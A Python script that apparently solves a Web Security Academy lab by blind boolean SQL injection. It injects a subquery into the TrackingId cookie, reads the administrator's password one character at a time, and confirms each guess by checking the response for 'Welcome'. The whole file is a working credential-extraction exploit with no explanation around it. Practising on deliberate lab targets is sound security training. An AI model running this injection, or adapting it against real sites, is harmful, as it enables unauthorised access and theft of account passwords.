import requests
import string
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies  = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

burp0_url = "https://0a06005c036b97fe80a4fd3600630005.web-security-academy.net:443/filter?category=Corporate+gifts"
burp0_cookies = {"TrackingId": "qsdy1rKE1nnhg7Ki", "session": "2xiBRjIoyDAJ9t8Ckfl8gv8wJ5GsLTif"}
burp0_headers = {"Sec-Ch-Ua": "\"Not.A/Brand\";v=\"99\", \"Chromium\";v=\"136\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Accept-Language": "en-US,en;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0a06005c036b97fe80a4fd3600630005.web-security-academy.net/", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}


char_set = string.ascii_lowercase + string.digits
password = ''

for position in range(1,21):
    for char in char_set:
        burp0_cookies["TrackingId"] = f"qsdy1rKE1nnhg7Ki' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username = 'administrator')='{char}" 
        print(f"Testing {position}:{char}")
        response = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False, proxies=proxies)

        if "Welcome" in response.text:
            print(f"[+] found {position}:{char}")
            password += char
            break

print(f"Pass: {password}")